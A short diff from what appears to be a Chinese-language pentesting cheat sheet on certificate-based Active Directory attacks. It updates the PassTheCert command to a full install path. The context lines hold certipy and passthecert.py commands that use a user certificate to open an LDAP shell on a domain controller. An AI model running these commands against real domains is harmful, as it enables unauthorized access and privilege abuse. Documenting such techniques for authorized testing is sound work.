@@ -104,8 +104,8 @@ certipy auth -pfx user.pfx -dc-ip DC_IP
 # 使用 Schannel 认证
 certipy auth -pfx user.pfx -dc-ip DC_IP -ldap-shell
 
-# 或用 PassTheCert
-python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain DOMAIN -dc-ip DC_IP
+# 或用 PassTheCert（工具路径默认安装在: /pentest/PassTheCert/Python/）
+python3 /pentest/PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain DOMAIN -dc-ip DC_IP
 ```
 
 ## 工具速查
